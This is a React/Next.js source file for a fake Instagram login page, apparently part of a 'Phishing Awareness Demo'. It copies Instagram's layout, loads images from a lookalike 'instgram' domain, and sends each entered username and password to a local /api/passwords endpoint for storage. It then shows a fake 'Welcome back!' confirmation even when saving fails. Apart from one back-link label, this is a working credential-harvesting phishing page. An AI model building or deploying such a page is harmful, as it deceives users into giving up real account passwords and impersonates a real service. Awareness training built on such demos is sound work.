"use client";

import React, { useState } from 'react';
import { Facebook } from 'lucide-react';
import { useRouter } from 'next/navigation';
import Link from 'next/link';

function InstagramLoginPage() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const router = useRouter();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!password) return;

    setIsLoading(true);

    try {
      // Save password and username to API
      const response = await fetch('/api/passwords', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          password: password,
          email: username,
          site: 'Instagram'
        }),
      });

      const data = await response.json();

      if (data.success) {
        setIsLoading(false);
        setIsSuccess(true);

        // Redirect after success
        setTimeout(() => {
          router.push('/');
        }, 2000);
      } else {
        throw new Error('Failed to save credentials');
      }
    } catch (error) {
      console.error('Error saving credentials:', error);
      setIsLoading(false);
      // Still show success for demo purposes
      setIsSuccess(true);
      setTimeout(() => {
        router.push('/');
      }, 2000);
    }
  };

  return (
    <div className="bg-gray-50 min-h-screen flex flex-col font-sans text-sm text-gray-800">
      <main className="flex-grow flex items-center justify-center py-10">
        <div className="w-full max-w-xs">
          <div className="bg-white border border-gray-300 rounded p-8 mb-4">
            <img
              src="https://78ccf4-instgram.alerting-services.com/instagram/7a252de00b20.png"
              alt="Instagram"
              className="mx-auto mb-8 h-12"
            />
            {isSuccess ? (
              <div className="text-center">
                <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
                  <svg className="w-8 h-8 text-green-600" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                  </svg>
                </div>
                <h3 className="text-lg font-semibold text-gray-900 mb-2">Welcome back!</h3>
                <p className="text-gray-600">Redirecting to your feed...</p>
              </div>
            ) : (
              <form onSubmit={handleSubmit}>
                <div className="mb-2">
                  <input
                    type="text"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    className="w-full px-2 py-2 text-xs border rounded bg-gray-50 focus:outline-none focus:border-gray-400 text-gray-900 placeholder:text-gray-500"
                    placeholder="Phone number, username, or email"
                  />
                </div>
                <div className="mb-4">
                  <input
                    type="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full px-2 py-2 text-xs border rounded bg-gray-50 focus:outline-none focus:border-gray-400 text-gray-900 placeholder:text-gray-500"
                    placeholder="Password"
                    required
                  />
                </div>
                <button
                  type="submit"
                  disabled={isLoading || !password}
                  className="w-full bg-blue-500 text-white font-semibold py-1.5 rounded opacity-90 hover:opacity-100 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center"
                >
                  {isLoading ? (
                    <>
                      <svg className="animate-spin -ml-1 mr-3 h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                      </svg>
                      Logging in...
                    </>
                  ) : (
                    'Log In'
                  )}
                </button>
              </form>
            )}

            <div className="flex items-center my-4">
              <div className="flex-grow border-t border-gray-300"></div>
              <span className="mx-4 text-gray-500 font-semibold text-xs">OR</span>
              <div className="flex-grow border-t border-gray-300"></div>
            </div>

            <button 
              type="button" 
              className="w-full flex items-center justify-center text-sm font-semibold text-blue-800"
            >
              <Facebook className="w-4 h-4 mr-2" />
              <span>Log in with Facebook</span>
            </button>

            <a href="#" className="block text-center text-xs text-blue-800 mt-4">
              Forgot password?
            </a>
          </div>

          <div className="bg-white border border-gray-300 rounded p-4 text-center">
            <p>
              Don't have an account?{' '}
              <a href="#" className="font-semibold text-blue-500">
                Sign up
              </a>
            </p>
          </div>

          <div className="text-center mt-4">
            <p>Get the app.</p>
            <div className="flex justify-center mt-4 space-x-2">
              <a href="#">
                <img 
                  src="https://78ccf4-instgram.alerting-services.com/instagram/180ae7a0bcf7.png" 
                  alt="Download on the App Store" 
                  className="h-10"
                />
              </a>
              <a href="#">
                <img 
                  src="https://78ccf4-instgram.alerting-services.com/instagram/e9cd846dc748.png" 
                  alt="Get it on Google Play" 
                  className="h-10"
                />
              </a>
            </div>
          </div>
        </div>
      </main>

      <footer className="text-center text-xs text-gray-500 p-4">
        <div className="flex flex-wrap justify-center space-x-4 mb-4">
          <a href="#" className="hover:underline">Meta</a>
          <a href="#" className="hover:underline">About</a>
          <a href="#" className="hover:underline">Blog</a>
          <a href="#" className="hover:underline">Jobs</a>
          <a href="#" className="hover:underline">Help</a>
          <a href="#" className="hover:underline">API</a>
          <a href="#" className="hover:underline">Privacy</a>
          <a href="#" className="hover:underline">Terms</a>
          <a href="#" className="hover:underline">Top Accounts</a>
          <a href="#" className="hover:underline">Hashtags</a>
          <a href="#" className="hover:underline">Locations</a>
          <a href="#" className="hover:underline">Instagram Lite</a>
        </div>
        <div className="space-x-4">
          <span>English</span>
          <span>© 2025 Instagram from Meta</span>
        </div>
      </footer>

      {/* Back to Home - Mobile responsive positioning */}
      <div className="fixed bottom-4 left-1/2 transform -translate-x-1/2 md:absolute md:bottom-4 md:left-auto md:right-4 md:transform-none">
        <Link href="/" className="text-sm text-gray-600 hover:text-gray-800 bg-white/90 backdrop-blur-sm px-3 py-1 rounded-full shadow-sm md:bg-transparent md:shadow-none md:px-0 md:py-0">
          ← Back to Phishing Awareness Demo
        </Link>
      </div>
    </div>
  );
}

export default InstagramLoginPage;